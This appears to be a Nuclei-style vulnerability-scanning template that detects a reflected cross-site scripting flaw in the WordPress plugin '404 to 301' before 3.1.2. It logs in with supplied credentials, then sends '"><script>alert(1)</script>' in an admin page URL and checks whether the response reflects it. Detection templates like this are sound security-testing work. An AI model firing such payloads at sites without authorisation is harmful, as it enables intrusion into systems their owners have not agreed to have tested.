id: 404-to-301-xss
info:
  author: Akincibor
  description: The plugin does not escape some URLs before outputting them back in
    attributes, leading to Reflected Cross-Site Scripting.
  name: 404 to 301 < 3.1.2 - Reflected Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/4a310b4f-79fa-4b74-93f8-e4522921abe1
  - https://wordpress.org/plugins/404-to-301
  severity: medium
  tags: wp-plugin,xss,wp,wordpress,authenticated
requests:
- cookie-reuse: true
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"><script>alert(1)</script>'
    - 404 Error Logs
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: wordpress_test_cookie=WP%20Cookie%20check


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/admin.php?page=jj4t3-logs&a"><script>alert(1)</script> HTTP/1.1

    Host: {{Hostname}}

    '
